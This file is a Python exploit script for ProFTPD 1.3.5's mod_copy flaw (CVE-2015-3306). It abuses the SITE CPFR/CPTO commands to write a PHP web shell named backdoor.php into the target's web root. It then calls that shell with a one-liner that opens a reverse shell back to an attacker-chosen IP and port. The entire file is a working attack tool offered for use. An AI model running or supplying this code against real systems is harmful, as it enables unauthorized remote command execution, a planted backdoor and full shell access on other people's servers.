#!/usr/bin/env python3

import argparse
import socket
import requests

# Parse command-line arguments
parser = argparse.ArgumentParser(description='Reverse Shell Script')
parser.add_argument('-t', '--target', required=True, help='Target IP address')
parser.add_argument('-r', '--reverse', required=True, help='Reverse IP address')
parser.add_argument('-p', '--port', required=False, default=3080, help='Reverse port')
parser.add_argument('--path', required=False,default="/var/www/html",help='Path to the directory where the PHP file will be created')
args = parser.parse_args()

# Set target and reverse details
target_ip = args.target
reverse_ip = args.reverse
reverse_port = args.port

# Construct the shell command with the provided reverse IP and port
shell = f"python -c 'import os, socket;s=socket.socket();s.connect((\"{reverse_ip}\", {reverse_port}));os.dup2(s.fileno(), 0);os.dup2(s.fileno(), 1);os.dup2(s.fileno(), 2);os.system(\"/bin/sh\")'"

# Establish connection to the target FTP server
with socket.socket() as s:
    s.connect((target_ip, 21))
    s.send(b"SITE CPFR /proc/self/cmdline\n")
    s.send(b"SITE CPTO /tmp/<?php system($_GET['c']) ?>\n")
    s.send(b"SITE CPFR /tmp/<?php system($_GET['c']) ?>\n")
    s.send(b"SITE CPTO /var/www/html/backdoor.php\n")

# Make a request to the target server to trigger the reverse shell
BOLD = '\033[1m'
RED = '\033[91m'
GREEN = '\033[92m'
RESET = '\033[0m'

# Print the title in bold and red color
print(BOLD + RED + "ProFTPd 1.3.5 - (mod_copy) Remote Command Execution" + RESET)
print(BOLD + GREEN + "CVE-2015-3306 exploit by Tiger3080" + RESET)
print("[+] Exploiting " + args.target)
print("[+] Reverse Connection " + args.reverse + " at port " + str(args.port))
r = requests.get(f"http://{target_ip}/backdoor.php", params={'c': shell})
